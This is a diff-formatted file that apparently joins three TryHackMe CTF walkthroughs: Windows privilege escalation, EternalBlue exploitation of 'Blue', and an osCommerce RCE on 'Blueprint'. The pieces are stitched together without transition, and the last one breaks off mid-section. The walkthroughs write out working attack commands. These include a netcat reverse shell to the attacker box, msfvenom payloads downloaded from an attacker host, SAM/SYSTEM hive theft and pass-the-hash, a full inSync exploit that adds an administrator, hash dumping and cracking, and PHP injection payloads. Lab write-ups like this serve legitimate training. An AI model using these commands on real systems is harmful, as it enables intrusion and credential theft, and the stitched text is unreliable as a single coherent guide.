@@ -1,0 +1,721 @@
+In this walkthrough I will be explaining some of the answers and providing all answers for the Windows Privilege Escalation room on TryHackMe. I really hope all of my explanations make sense, and that you get something out of this. If you have any feedback, feel free to leave it in the comments.
+
+Press enter or click to view image in full size
+
+Photo by Sunrise King on Unsplash
+Windows Privilege Escalation
+For both the questions under this task, the answers can be found in the text of the task. I will also therefore not go into any more detail about the answers.
+
+Users that can change system configurations are part of which group?
+Administrators
+
+The SYSTEM account has more privileges than the Administrator user (aye/nay)
+aye
+
+Harvesting Passwords from Usual Spots
+A password for the julia.jones user has been left on the Powershell history. What is the password?
+To answer this question, we can use the technique that was provided in the text of the task. We can run this command in cmd: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt . As a result of that we will get:
+
+Press enter or click to view image in full size
+
+ZuperCkretPa5z
+
+A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
+To answer this question, we can use the technique provided in the text of the task and run this command:
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+Press enter or click to view image in full size
+
+From the output we can see that the password of the user db_admin is:
+
+098n0x35skjD3
+
+There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
+To find the saved Windows credentials, we can run cmdkey /list, which get us mike.katz password and username.
+
+
+To spawn a shell as mike.katz we can run runas /savecred /user:mike.katz
+
+
+This spawns a shell as mike.katz . Now we have to navigate to C:\Users\mike.katz\Desktop and then we can run type flag.txt to see the contents of the flag.
+
+
+Don’t be like me and don’t try to run cat on Windows…
+THM{WHAT_IS_MY_PASSWORD}
+
+Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
+Again, the text of the task gives us the exact command that we have to run to get the answer:
+
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+Press enter or click to view image in full size
+
+From the output we can see that the password of user thom.smith is:
+
+CoolPass2021
+
+Other Quick Wins
+What is the taskusr1 flag?
+To answer this question, we can follow the description in the task of how to exploit scheduled tasks.
+
+This exploit relies on the fact that for some scheduled tasks may have lost their binaries or they use binaries that you can modify.
+
+To view all scheduled tasks, run schtasks.
+
+
+There are a lot of results, but we see that the first is called vulntask. To view information about a scheduled task, you can run this command: schtasks /query /tn vulntask /fo list /v
+
+Press enter or click to view image in full size
+
+We can see that this task runs schtask.bat, to see if we can modify that bat file, we can run icacls c:\tasks\schtask.bat
+
+
+The BUILTIN\Users: (I)(F) tells us that the Users group has full access over the binary, meaning we can modify it. We want to modify it so that it will start a reverse shell to our attackbox.
+
+I first set up a listener on my attackbox using nc -lvp 9292, then changed the binary to start a reverse shell using this command: echo c:\tools\nc64.exe -e cmd.exe ATTACKBOX-IP 9292 > C:\tasks\schtask.bat
+
+Usually we would have to wait for the task to run, but luckily we can run it manually in this challenge using: schtasks /run /tn vulntask
+
+Going back to our attackbox now, we can see that we have a shell as taskusr1, so we can navigate to his desktop under C:\Users\taskusr1\Desktop and read the flag.txt file using type flag.txt
+
+
+Flag is: THM{TASK_COMPLETED}
+
+Abusing Service Misconfigurations
+Get the flag on svcusr1’s desktop.
+To get the flag on svcuse1’s desktop, we need to exploit the insecure permissions on a service executable. We will first query a known vulnerable service configuration by using sc qc WindowsScheduler
+
+
+We can see under SERVICE_START_NAME that it is run by user svcusr1, and it runs the service WService.exe . We can check the permissions on the WService.exe with this command: icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+
+
+We can see from Everyone: (I)(M) that everyone can modify the file, meaning also we can overwrite it with our payload. We use msfvenom to craft a exe-service payload with this command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=9292 -f exe-service -o rev-svc.exe, then we can host it on an http server using python3 -m http.server
+
+On Powershell, we can cd into C:\Users\thm-unpriv\Downloads and use wget http://ATTACKBOX-IP:8000/rev-svc.exe -O rev-svc.exe
+
+Now that we have our exploit, there are a few things we need to do in cmd to overwrite the service executable. First, go to the folder where it is located, cd C:\PROGRA~2\SYSTEM~1\.
+Then rename the service executable using move WService.exe WService.exe.bkp.
+Now overwrite the executable with our payload using move C:\Users\thm-unpriv\rev-svc.exe WService.exe.
+Lastly, we grant full permissions to the Everyone group, so that another user can execute it: icacls WService.exe
+
+The executable is now ready to run, we only have to set up a listener on our attackbox using nc -lvp 9292, and to actually run the executable, we would usually have to wait, but in this challenge we can restart the service to run the task using sc stop windowsscheduler and sc start windowsshceduler.
+
+When we switch over to the attackbox, we can see that we’ve got shell as svcusr1. So we can navigate to C:\Users\svcusr1\Desktop and use type flag.txt to read the flag:
+
+Get Alan’s stories in your inbox
+Join Medium for free to get updates from this writer.
+
+Enter your email
+Subscribe
+THM{AT_YOUR_SERVICE}
+
+Get the flag on svcusr2’s desktop.
+When there are folders with spaces in their name, like in the picture below, and these folders contain service executables, then we don’t have to be able to modify the executable it self, but we can create our own.
+
+
+Windows will try to run C:\MyPrograms\Disk.exe first with the rest as arguments, and this is the executable we are going to overwrite.
+
+First step is to create an exploit on our attackbox using this command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=9292 -f exe-service -o rev-svc2.exe, then host it on a http server, like with in the last question, using python3 -m http.server.
+
+Press enter or click to view image in full size
+
+Next step is to download it on our windows machine using powershell and this command: wget http://ATTACKBOX-IP:8000/rev-svc2.exe -O rev-svc2.exe
+
+Now, back in the cmd of the windows machine, we need to overwrite the Disk.exe that windows will attempt to run before the proper service executable. We do that with this command: C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe, and then give full privileges to the Everyone group: C:\MyPrograms\Disk.exe /grant Everyone:F.
+
+Our exploit is now ready, last thing to do before restarting the service “disk sorter enterprise” is to start a listener on the attackbox: nc -lvp 9292.
+
+Last thing we need to do now is restart the service with these 2 commands: sc stop "disk sorter enterprise" and sc start "disk sorter enterprise"
+
+
+Back on our attackbox, we can see that we have access as the service user that runs the service executable, svcusr2. We can navigate to his desktop using cd C:\Users\svcuser2\Desktop and then print the flag.txt contents using type flag.txt.
+
+
+Flag is: THM{QUOTES_EVERYWHERE}
+
+Get the flag on the Administrator’s desktop.
+One last thing we can do, if everything else is correctly configured, then we can check the Discretionary Access Control List (DACL)of the service itself and see if it allows us to configure it. If so, we can reconfigure the service to run any binary that we want with any account that we want, even System!
+
+In the task, to check the service DACL, we can use the tool called accesschk which is located under C:\tools\AccessChk. To check the THMService we can run this command from the C:\tools\AccessChk\ folder: accesschk64.exe -qlc THMService
+
+
+At the very end we can see ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+SERVICE_ALL_ACCESS, which means any user can reconfigure the service.
+
+Again we create a payload on our attackbox using msfvenom like in the previous questions: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX-IP LPORT=9292 -f exe-service -o rev-svc3.exe and then host it on a http server using python3 -m http.server.
+
+Press enter or click to view image in full size
+
+Then back on our windows machine, in powershell, run this command to grab the payload: wget http://ATTACKBOX-IP:8000/rev-svc3.exe -O rev-svc3.exe. Once we have it in the folder C:\Users\thm-unpriv, back in the cmd, we have to give the Everyone group full permissions to the file: icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+
+All that is left to do now is; first start a listener on the attackbox using nc -lvp 9292, then reconfigure the service to run our payload with the user of our choice, in this case LocalSystem as it has the highest privileges. We can do the latter with this command: sc config THMService binPath= “C:\Users\thm-unpriv\rev-svc3.exe” obj= LocalSystem
+
+
+To get the shell back on our attackbox, we have to restart the service using sc stop THMService and sc start THMService
+
+
+Back on our attackbox we now have shell, and we can navigate to C:\Users\Administrator\Desktop and run type flag.txt to see the flag.
+
+
+Flag is: THM{INSECURE_SVC_CONFIG}
+
+Abusing dangerous privileges
+Get the flag on the Administrator’s desktop.
+There are 3 ways to get this flag. I did it the first way, using SeBackup / SeRestore. All the methods are pretty well described by TryHackMe and quite easy to follow, but I will go through how I did it with the first method.
+
+First start by running remmina on your attackbox and connecting via rdp to the machine using the credentials provided. The account that we are logging in with is part of the group called Backup Operators, allowing us to create backups from a system without administrator privileges.
+
+Once logged in to the machine, run CMD as administrator to get the privileges needed. To view our privileges, we can run whoami /priv:
+
+
+Next, we can backup the SAM and SYSTEM hashes, where we can retrieve password of different users, using these commands:reg save hklm\system C:\Users\THMBackup\system.hive and reg save hklm\sam C:\Users\THMBackup\sam.hive
+
+
+To get the files on our attacker machine, we can start an SMB server with a network share in our directory using these command: mkdir share and python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share.
+
+To copy the files from the windows machine to our attackbox, use these two commands: copy C:\Users\THMBackup\sam.hive \\ATTACKBOX_IP\public\ and copy C:\Users\THMBackup\system.hive \\ATTACKBOX_IP\public\
+
+To extract the hashes of the different users, on your attackbox, go into the share folder, then run python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+Press enter or click to view image in full size
+
+Now we can run a pass-the-hash attack using the administrators hash using this command: python3.9 /opt/impacket/examples/psexec.py -hashes ADMINISTRATOR-HASH administrator@WINDOWS-IP
+
+Press enter or click to view image in full size
+
+Now we have a admin shell, so we can go to C:\Users\Administrator\Desktop and read the contents of flag.txt using type flag.txt.
+
+
+Flag is: THM{SEFLAGPRIVILEGE}
+
+Abusing vulnerable software
+Get the flag on the Administrator’s desktop.
+There is a vulnerable application on the machine, and we can use the provided exploit from the task text, just update the $cmd to net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add.
+
+The full command, which I simply put into powershell, looks like this:
+
+$ErrorActionPreference = “Stop”;
+$cmd = “net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add”;
+
+$s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);
+$s.Connect(“127.0.0.1”, 6064);
+
+$header = [System.Text.Encoding]::UTF8.GetBytes(“inSync PHC RPCW[v0002]”);
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes(“$([char]0x0005)`0`0`0”);
+$command = [System.Text.Encoding]::Unicode.GetBytes(“C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd”);
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header);
+$s.Send($rpcType);
+$s.Send($length);
+$s.Send($command)
+To confirm that we have added the user, we can open CMD and run net user pwnd:
+
+
+As we can see, our user is in the Administrators group. Now we can run CMD as administrator, then use the account we just created to get access:
+
+
+When logged in, we can navigate to C:\Users\Administrator\Desktop and read the contents of flag.txt using type flag.txt
+
+
+The flag is: THM{EZ_DLL_PROXY_4ME}
+
+Thank You!
+Thank you for taking the time to read this walkthrough. I hope you got something out of this, because I definitely did. As I said, if you have any feedback or comments, I will be more than happy to read them, so leave them down below! See you in the next one!
+
+
+
+  Task 1: Recon
+Set up your virtual environment
+To successfully complete this room, you’ll need to set up your virtual environment. This involves starting both your AttackBox and Task Machines, ensuring you’re equipped with the necessary tools and access to tackle the challenges ahead.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Press the Start Machine button below.
+
+Start the AttackBox by pressing the Start AttackBox button at the top of this page. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue Show Split View button at the top of the page.
+
+Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.
+
+
+Art by one of our members, Varg — THM Profile — Instagram — Blue Merch — Twitter
+
+Link to Ice, the sequel to Blue: Link
+
+You can check out the third box in this series, Blaster, here: Link
+
+— — — — — — — — — — — — — — — — — — — — -
+
+The virtual machine used in this room (Blue) can be downloaded for offline usage from https://darkstar7471.com/resources.html
+
+Enjoy the room!
+
+Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
+A: No answer needed
+
+How many ports are open with a port number under 1000?
+To find out how many ports are open with a port number under 1000 on the target machine, follow these steps:
+Scan the Target Machine: Use Nmap to scan the target machine and identify open ports. You can do this by running the following command:
+nmap -p- <target_ip>
+If you want to filter the results for ports under 1000 directly, you can use:
+nmap -p 1-999 <target_ip>
+And I got:
+root@ip-10-10-12-251:~# nmap -p 1-999 10.10.165.91
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-15 13:28 GMT
+Nmap scan report for 10.10.165.91
+Host is up (0.00067s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 02:61:8B:DC:EC:E7 (Unknown)
+Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds
+A: 3
+
+What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067) ?
+The machine is likely vulnerable to MS17–010, which is an SMB vulnerability exploited by the EternalBlue exploit.
+Here’s a quick breakdown:
+MS17–010 is a Microsoft security update that addresses vulnerabilities in SMBv1 (Server Message Block version 1).
+EternalBlue is a well-known exploit that was leaked by the ShadowBrokers in 2017 and takes advantage of this vulnerability in SMBv1 to allow remote code execution.
+To confirm this vulnerability:
+You can run an Nmap scan with the SMB Version Detection script:
+nmap -p 445 --script=smb-vuln-ms17-010 10.10.165.91
+root@ip-10-10-12-251:~# nmap -p 445 --script=smb-vuln-ms17-010 10.10.165.91
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-15 13:30 GMT
+Nmap scan report for 10.10.165.91
+Host is up (0.00017s latency).
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 02:61:8B:DC:EC:E7 (Unknown)
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
+A: ms17–010
+
+Task 2: Gain Access
+Exploit the machine and gain a foothold.
+
+Start Metasploit
+A: No answer needed
+
+Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)
+Start Metasploit:
+msfconsole
+Once inside Metasploit, search for the exploit:
+search ms17_010
+We get:
+msf6 > search ms17_010
+Matching Modules
+================
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+Interact with a module by name or index. For example info 26, use 26 or use auxiliary/scanner/smb/smb_ms17_010
+A: exploit/windows/smb/ms17_010_eternalblue
+
+Show options and set the one required value. What is the name of this value? (All caps for submission)
+To show the options for the EternalBlue exploit in Metasploit and set the required value, you can follow these steps:
+After selecting the EternalBlue exploit , show the available options:
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://d
+                                             ocs.metasploit.com/docs/using-met
+                                             asploit/basics/using-metasploit.h
+                                             tml
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to
+                                             use for authentication. Only affe
+                                             cts Windows Server 2008 R2, Windo
+                                             ws 7, Windows Embedded Standard 7
+                                              target machines.
+   SMBPass                         no        (Optional) The password for the s
+                                             pecified username
+   SMBUser                         no        (Optional) The username to authen
+                                             ticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matc
+                                             hes exploit Target. Only affects
+                                             Windows Server 2008 R2, Windows 7
+                                             , Windows Embedded Standard 7 tar
+                                             get machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploi
+                                             t Target. Only affects Windows Se
+                                             rver 2008 R2, Windows 7, Windows
+                                             Embedded Standard 7 target machin
+                                             es.
+Payload options (windows/x64/meterpreter/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     10.10.12.251     yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Target
+View the full module info with the info, or info -d command.
+A: RHOSTS
+
+Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
+set payload windows/x64/shell/reverse_tcp
+To follow through with this task, you’re going to set the payload for the exploit and then run it.
+Set the payload by running:
+set payload windows/x64/shell/reverse_tcp
+run
+With that done, run the exploit!
+A: No answer needed
+
+Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
+A: No answer needed
+
+Task 3: Escalate
+Escalate privileges, learn how to upgrade shells in metasploit.
+
+If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
+To escalate privileges and upgrade your shell to a Meterpreter session in Metasploit, you’ll need to use a post-exploitation module to convert the shell.
+Background your current shell: Press CTRL + Z to background the shell.
+Research and find the post module: The module you’ll use to upgrade your shell to Meterpreter is:
+post/multi/manage/shell_to_meterpreter
+A: post/multi/manage/shell_to_meterpreter
+
+Select this (use MODULE_PATH). Show options, what option are we required to change?
+show options
+msf6 post(multi/manage/shell_to_meterpreter) > show options
+Module options (post/multi/manage/shell_to_meterpreter):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to recei
+                                       ve the connection
+   LHOST                     no        IP of host that will receive the connec
+                                       tion from the payload (Will try to auto
+                                        detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+View the full module info with the info, or info -d command.
+A: SESSION
+
+Set the required option, you may need to list all of the sessions to find your target here.
+set SESSION 1
+Also set the LHOST to our Attack Box’s IP:
+set LHOST <Your Attack Box's IP>
+Run! If this doesn’t work, try completing the exploit from the previous task once more.
+run
+msf6 post(multi/manage/shell_to_meterpreter) > run
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.12.251:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (203846 bytes) to 10.10.165.91
+[*] Meterpreter session 2 opened (10.10.12.251:4433 -> 10.10.165.91:49215) at 2025-02-15 13:59:26 +0000
+[*] Stopping exploit/multi/handler
+A: No answer needed
+
+Once the meterpreter shell conversion completes, select that session for use.
+sessions -i 1
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 1
+[*] Starting interaction with 1...
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+A: No answer needed
+
+Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command ‘shell’ and run ‘whoami’. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+A: No answer needed
+
+List all of the processes running via the ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
+sessions -i 2
+meterpreter > ps
+Process List
+============
+ PID   PPID  Name         Arch  Session  User               Path
+ ---   ----  ----         ----  -------  ----               ----
+ 0     0     [System Pro             cess]
+ 4     0     System       x64   0
+ 416   4     smss.exe     x64   0        NT AUTHORITY\SYST  \SystemRoot\System
+                                         EM                 32\smss.exe
+ 488   692   svchost.exe  x64   0        NT AUTHORITY\SYST
+                                         EM
+ 544   536   csrss.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\csrss.exe
+ 592   536   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\wininit.exe
+ 604   584   csrss.exe    x64   1        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\csrss.exe
+ 644   584   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
+             e                           EM                 2\winlogon.exe
+ 692   592   services.ex  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+             e                           EM                 2\services.exe
+ 700   592   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\lsass.exe
+ 708   592   lsm.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\lsm.exe
+ 816   692   svchost.exe  x64   0        NT AUTHORITY\SYST
+                                         EM
+ 884   692   svchost.exe  x64   0        NT AUTHORITY\NETW
+                                         ORK SERVICE
+ 932   692   svchost.exe  x64   0        NT AUTHORITY\LOCA
+                                         L SERVICE
+ 1000  644   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\LogonUI.exe
+ 1020  692   svchost.exe  x64   0        NT AUTHORITY\SYST
+                                         EM
+ 1064  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
+                                         L SERVICE
+ 1164  692   svchost.exe  x64   0        NT AUTHORITY\NETW
+                                         ORK SERVICE
+ 1292  692   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\spoolsv.exe
+ 1328  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
+                                         L SERVICE
+ 1392  692   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             agent.exe                   EM                 mazon\SSM\amazon-s
+                                                            sm-agent.exe
+ 1464  692   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             xe                          EM                 mazon\XenTools\Lit
+                                                            eAgent.exe
+ 1532  1292  cmd.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+                                         EM                 2\cmd.exe
+ 1596  692   Ec2Config.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
+             xe                          EM                 mazon\Ec2ConfigSer
+                                                            vice\Ec2Config.exe
+ 1908  692   svchost.exe  x64   0        NT AUTHORITY\NETW
+                                         ORK SERVICE
+ 2036  544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\conhost.exe
+ 2084  816   WmiPrvSE.ex
+             e
+ 2336  692   svchost.exe  x64   0        NT AUTHORITY\LOCA
+                                         L SERVICE
+ 2364  692   sppsvc.exe   x64   0        NT AUTHORITY\NETW
+                                         ORK SERVICE
+ 2428  692   svchost.exe  x64   0        NT AUTHORITY\SYST
+                                         EM
+ 2548  544   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
+                                         EM                 2\conhost.exe
+ 2564  692   vds.exe      x64   0        NT AUTHORITY\SYST
+                                         EM
+ 2696  692   SearchIndex  x64   0        NT AUTHORITY\SYST
+             er.exe                      EM
+ 2904  2040  powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
+             exe                         EM                 2\WindowsPowerShel
+                                                            l\v1.0\powershell.
+                                                            exe
+ 3032  692   TrustedInst  x64   0        NT AUTHORITY\SYST
+             aller.exe                   EM
+The process running with NT AUTHORITY\SYSTEM is PID 416: smss.exe
+This is a system process running with NT AUTHORITY\SYSTEM privileges. You can now use this process ID (416) to further interact or perform tasks with it.
+A: No answer needed
+
+Migrate to this process using the ‘migrate PROCESS_ID’ command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.
+To migrate to the smss.exe process (PID 416), use the following command in Meterpreter:
+migrate 416
+A: No answer needed
+
+Task 4: Cracking
+Dump the non-default user’s password and crack it!
+
+Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
+hashdump
+
+A: Jon
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+Obtain the hash: After running the hashdump command in Meterpreter, locate the hash for the user "jon." It will look something like this:
+jon:$NT$1234567890abcdef1234567890abcdef:...
+Create a file to store the hash: Open a text editor or use a command-line tool like echo or cat to create a file named hash.txt and paste the hash into it. For example:
+echo "jon:$NT$1234567890abcdef1234567890abcdef" > hash.txt
+Now that the hash is in hash.txt, and you have John the Ripper installed, you can start cracking the hash.
+Run John the Ripper: Run the following command to start cracking the hash using the rockyou.txt wordlist:
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Once John the Ripper has finished cracking the password, you can view the results by running the following command:
+john --show hash.txt
+A: alqfna22
+
+Task 5: Find flags!
+Find the three flags planted on this machine. These are not traditional flags, rather, they’re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!
+
+Hey, cyber adventurers!
+
+Ready to dive into another TryHackMe challenge? Today, we’re tackling “Blueprint,” a Windows machine (Target IP: 10.10.199.204) that tests our web exploitation and post-exploitation skills.
+
+This walkthrough details the path from identifying a vulnerable osCommerce setup to achieving NT AUTHORITY\SYSTEM privileges and capturing the flags. If you’re searching for a guide covering osCommerce 2.3.4 RCE, PHP disable_functions bypasses, and Windows hash dumping, let’s get started!
+
+Phase 1: Recon & Enumeration — Mapping the Blueprint
+As always, reconnaissance is key.
+
+sudo nmap -p- -sV 10.10.199.204 -vv
+After launching the instance at 10.10.199.204, initial nmap scans (or simply Browse) pointed towards an HTTP server on port 8080.
+
+Loading http://10.10.199.204:8080 revealed an osCommerce shop (v2.3.4) running inside /oscommerce-2.3.4/catalog/.
+
+The critical discovery was the exposed installation directory: http://10.10.199.204:8080/oscommerce-2.3.4/catalog/install/
+The presence of install.php immediately flagged a potential high-impact vulnerability.
+
+Press enter or click to view image in full size
+
+Phase 2: Exploitation — Cracking osCommerce for RCE
+osCommerce 2.3.4 suffers from a well-documented Remote Code Execution (RCE) vulnerability (often cited as CVE-2017–16350 or similar) if the /install/ directory remains accessible. An unauthenticated attacker can re-run step 4 of the installation (install.php?step=4), injecting malicious PHP code into the includes/configure.php file via the DB_DATABASE parameter.
+
+I utilized a public Python exploit script (44374.py from Exploit-DB or similar sources) designed for this vulnerability.
+
+OffSec's Exploit Database Archive
+osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform
+www.exploit-db.com
+
+Navigating the Exploit Path
+Initial Injection
+The script POSTs to http://10.10.199.204:8080/oscommerce-2.3.4/catalog/install/install.php?step=4.
+My first payload attempt was ‘);system(“ls”);/*’.
+The Comment Conundrum
+This triggered a PHP “Unterminated comment” warning. The fix involved replacing the block comment /* with a single-line comment // at the end of the injected PHP code: ‘); PHP_CODE_HERE; //. A small detail, but crucial!
+OS Confirmation
+File paths revealed in errors (C:\xampp\…) confirmed the target OS was Windows. Linux payloads were out.
+Function Disabled!
+Trying commands via system() resulted in the dreaded “Warning: system() has been disabled for security reasons”. Time to probe the PHP configuration. I injected code to print environment details:
+
+// Payload Part in Python:
+payload = ‘\’);’
+payload += ‘echo “<pre>”; echo “disable_functions: “ . @ini_get(“disable_functions”) . “\\n”; echo “</pre>”;’
+payload += ‘//’
+The output was gold: disable_functions: system. Only system was blocked!
+passthru() to the Rescue
+I tested passthru(“whoami”). It worked perfectly, returning nt authority\system. Game on!
+The PowerShell Reverse Shell
